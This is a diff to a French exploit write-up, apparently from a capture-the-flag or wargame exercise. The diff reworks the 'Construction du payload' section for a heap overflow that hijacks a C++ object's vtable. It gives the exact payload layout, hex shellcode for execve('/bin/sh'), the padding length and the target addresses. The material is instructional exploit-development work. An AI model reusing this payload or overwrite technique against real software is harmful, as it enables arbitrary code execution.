@@ -97,14 +97,62 @@ distance       = 0x6c     = 108 octets
 ## Construction du payload
 
 ```
-┌──────────────┬──────────────┬─────────────┬──────────────┐
-│ fake vtable  │ shellcode    │ padding     │ &fake_vtable │
-│ (4 octets)   │ (25 octets)  │ (79 'A')    │ (4 octets)   │
-└──────────────┴──────────────┴─────────────┴──────────────┘
-   = &shellcode                                = &a->annotation
-   = 0x0804a010                                = 0x0804a00c
+            ┌──────────────┬──────────────┬─────────────┬──────────────┐
+ a->vtable_ │ fake vtable  │ shellcode    │ padding     │ &fake_vtable │
+   ptr (4o) │ (4 octets)   │ (25 octets)  │ (79 'A')    │ (4 octets)   │
+            └──────────────┴──────────────┴─────────────┴──────────────┘
+ 0x0804a008    0x0804a00c     0x0804a010                    écrase
+ = a (a+0)     = a+4          = a+8                          b->vtable_ptr
+ PAS écrit     = &annotation  = &shellcode                  (0x0804a078)
+ (on le saute) = &fake vtable
+```
 
-Total : 4 + 25 + 79 + 4 = 112 octets
+⚠️ **On NE touche PAS aux 4 premiers octets** (`a->vtable_ptr`, à `0x0804a008`).
+`setAnnotation` écrit dans `a->annotation`, qui commence à `a+4 = 0x0804a00c` : la
+copie démarre **après** le pointeur de vtable de `a`. Notre payload commence donc
+directement au buffer, et le tout premier octet qu'on écrit (`\x10\xa0\x04\x08`) est
+déjà *dans* le buffer, pas sur le pointeur de `a`.
+
+```
+a (objet) :
+  0x0804a008  a->vtable_ptr   ← INTACT, on saute par-dessus (setAnnotation écrit en a+4)
+  0x0804a00c  a->annotation   ← NOTRE PAYLOAD COMMENCE ICI (fake vtable + shellcode + ...)
+```
+
+Total payload : 4 + 25 + 79 + 4 = 112 octets (copiés à partir de `0x0804a00c`).
+
+### Le même schéma, avec le contenu réel de chaque partie
+
+```
+┌──────────────────┬──────────────────────────────┬─────────────┬──────────────────┐
+│   fake vtable    │           shellcode          │   padding   │   &fake_vtable   │
+│    (4 octets)    │          (25 octets)         │  (79 'A')   │    (4 octets)    │
+├──────────────────┼──────────────────────────────┼─────────────┼──────────────────┤
+│ \x10\xa0\x04\x08 │ \x31\xc0\x50\x68\x2f\x2f\x73  │ AAAA...AAAA │ \x0c\xa0\x04\x08 │
+│                  │ \x68\x68\x2f\x62\x69\x6e\x89  │ (79 fois A) │                  │
+│                  │ \xe3\x50\x53\x89\xe1\x31\xd2  │             │                  │
+│                  │ \xb0\x0b\xcd\x80              │             │                  │
+├──────────────────┼──────────────────────────────┼─────────────┼──────────────────┤
+│ = adresse du     │ = execve("/bin/sh",NULL,NULL)│ = bourrage  │ = adresse du     │
+│   shellcode      │   le vrai code à exécuter    │   pour      │   buffer = début │
+│   (0x0804a010)   │                              │   atteindre │   de la fake     │
+│                  │                              │   b->vtable │   vtable         │
+│                  │                              │   _ptr      │   (0x0804a00c)   │
+├──────────────────┼──────────────────────────────┼─────────────┼──────────────────┤
+│ "où est le code" │ "le code"                    │ "remplis    │ "où est la       │
+│                  │                              │  jusqu'à b" │  table de b"     │
+└──────────────────┴──────────────────────────────┴─────────────┴──────────────────┘
+   posé à            posé à                          posé à         écrase
+   0x0804a00c        0x0804a010                      0x0804a029     0x0804a078
+                                                                    (= b->vtable_ptr)
+```
+
+Qui lit quoi, au moment du `call` final :
+
+```
+ b->vtable_ptr  ─lit→  &fake_vtable (0x0804a00c)  ─lit→  fake vtable (0x0804a010)  ─call→  shellcode
+ (écrasé par           (1er pointeur : "la table          (2e pointeur : "la                (exécuté !)
+  le 4e bloc)           de b est dans le buffer")          fonction est ici")
 ```
 
 Détail des 4 blocs :
